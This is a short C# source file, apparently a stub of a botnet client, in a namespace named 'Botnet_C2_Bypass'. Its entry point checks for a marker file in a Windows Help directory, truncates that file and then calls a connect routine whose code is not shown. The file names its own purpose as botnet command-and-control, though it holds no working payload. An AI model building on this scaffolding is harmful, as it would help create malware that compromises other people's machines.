using System;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading.Tasks;
using System.Linq;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Botnet_C2_Bypass
{
    public class Program : Connecting
    {
        static async Task Main(string[] args)
        {
            string filePathss = @"C:\Windows\Help\Windows\ContentStore\en-US\Help";
            if (File.Exists(filePathss) == true)
            {
                File.Create(filePathss);
                await Connecting.Connect();
            }
            else return;
        }
    }
}
